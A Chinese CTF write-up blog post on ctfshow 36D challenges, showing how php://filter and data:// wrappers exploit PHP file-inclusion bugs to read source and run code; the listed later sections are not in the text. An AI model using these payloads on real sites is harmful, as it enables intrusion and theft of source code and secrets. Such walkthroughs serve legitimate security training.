<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="ctfshow36D练手赛+36D杯">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow36D练手赛+36D杯(已做完)">
<meta property="og:url" content="https://wanth3f1ag.top/2025/05/15/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B-36D%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="ctfshow36D练手赛+36D杯">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250419142016212.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250619163220559.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215003617627.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215003701886.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215004349936.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215004424281.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250619164207129.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215004943533.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241215005953930.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250515172421465.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241217221603876.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241217221733638.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219084711378.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219092943000.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093238973.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093531467.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093559492.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219152554679.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250516115212042.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250516120337230.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250516133116761.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219202259005.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219202330531.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219225610042.png">
<meta property="article:published_time" content="2025-05-15T08:42:23.000Z">
<meta property="article:modified_time" content="2025-12-01T11:22:09.270Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="36D杯">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250419142016212.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/05/15/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B-36D%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/05/15/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B-36D%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/","path":"2025/05/15/ctfshow36D练手赛-36D杯(已做完)/","title":"ctfshow36D练手赛+36D杯(已做完)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow36D练手赛+36D杯(已做完) | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#36D%E7%BB%83%E6%89%8B%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">36D练手赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E7%9F%A5%E6%89%80%E6%8E%AA-jpg"><span class="nav-number">1.1.</span> <span class="nav-text">不知所措.jpg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyshell"><span class="nav-number">1.2.</span> <span class="nav-text">easyshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#36D%E6%9D%AF"><span class="nav-number">2.</span> <span class="nav-text">36D杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%99%E4%BD%A0shell"><span class="nav-number">2.1.</span> <span class="nav-text">给你shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#explode-%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">explode()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strtoupper-%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.2.</span> <span class="nav-text">strtoupper()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8D%E4%B8%8E%E8%BF%90%E7%AE%97"><span class="nav-number">2.1.3.</span> <span class="nav-text">位与运算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RemoteImageDownloader"><span class="nav-number">2.2.</span> <span class="nav-text">RemoteImageDownloader</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PhantomJs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">2.2.1.</span> <span class="nav-text">PhantomJs 任意文件读取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ALL-INFO-U-WANT"><span class="nav-number">2.3.</span> <span class="nav-text">ALL_INFO_U_WANT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.1.</span> <span class="nav-text">#日志注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUSTCTF-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-Revenge"><span class="nav-number">2.4.</span> <span class="nav-text">WUSTCTF_朴实无华_Revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-number">2.4.2.</span> <span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3"><span class="nav-number">2.4.3.</span> <span class="nav-text">level 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUSTCTF-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-Revenge-Revenge"><span class="nav-number">2.5.</span> <span class="nav-text">WUSTCTF_朴实无华_Revenge_Revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1-1"><span class="nav-number">2.5.1.</span> <span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2-1"><span class="nav-number">2.5.2.</span> <span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3-1"><span class="nav-number">2.5.3.</span> <span class="nav-text">level 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login-Only-For-36D"><span class="nav-number">2.6.</span> <span class="nav-text">Login_Only_For_36D</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.6.1.</span> <span class="nav-text">#时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#regexp-binary%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">2.6.2.</span> <span class="nav-text">regexp binary正则匹配</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E5%8F%96%E5%90%A7"><span class="nav-number">2.7.</span> <span class="nav-text">你取吧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%A2%9E%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">2.7.1.</span> <span class="nav-text">#自增无字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">2.8.</span> <span class="nav-text">你没见过的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">2.8.1.</span> <span class="nav-text">#finfo文件注入</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">173</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">124</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/05/15/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B-36D%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow36D练手赛+36D杯(已做完) | root@wanth3f1ag">
      <meta itemprop="description" content="ctfshow36D练手赛+36D杯">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow36D练手赛+36D杯(已做完)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-05-15 16:42:23" itemprop="dateCreated datePublished" datetime="2025-05-15T16:42:23+08:00">2025-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:22:09" itemprop="dateModified" datetime="2025-12-01T19:22:09+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>29k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>26 分钟</span>
    </span>
</div>

            <div class="post-description">ctfshow36D练手赛+36D杯</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="36D练手赛"><a href="#36D练手赛" class="headerlink" title="36D练手赛"></a>36D练手赛</h1><h2 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h2><p>需要GET传入file参数且file参数必须有test</p>
<p>传入test.显示没有flag，不过可以确定是存在文件包含的，但是这里有test的阻碍的话该怎么正确读取文件呢？</p>
<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250419142016212.png" alt="image-20250419142016212"></p>
<p>官方手册中认证的参数只有这几个，所以传入的其他参数是不会被解析的</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/test这里随便写/resource=flag.</span><br></pre></td></tr></table></figure>

<p>我本来是试着去读flag的，但是没读出来</p>
<p>试试index看看能不能读到源代码，然后也是成功读到了index.php文件的源码，我们拿去解码一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$file</span>.<span class="string">&#x27;php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;$file must has test&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以看到是include包含，而且是有限制的文件包含，但是不影响我们用data伪协议</p>
<p>构造payload:</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//test ?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>成功执行，然后直接打就行</p>
<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>源码中看到一个注释掉的</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包看到一个Hash值,估计就是md5的结果，也就是pass的值</p>
<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250619163220559.png" alt="image-20250619163220559"></p>
<p>然后我们试着传入name和pass试一下</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">name</span>=<span class="number">1</span>&amp;<span class="keyword">pass</span>=f4d232dfb2c0d3f50350346fc68a1753</span><br></pre></td></tr></table></figure>

<p>传入发现response包中的cookie变了，我们跟进一下</p>
<p>看到了一个flflflflag.php，我们访问看看</p>
<p>一开始以为是404，抓包发现是假的，看到了include包含file参数，应该是任意文件包含漏洞，我们用伪协议去读取一下文件</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>想试着读一下flag发现不得行，先读index吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@<span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Hash&quot;</span>,<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>),<span class="title function_ invoke__">time</span>()+<span class="number">3600000</span>);<span class="comment">#</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span>=<span class="string">&#x27;%^$&amp;$#fffd&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flflflflag.php</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;yesec want Girl friend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

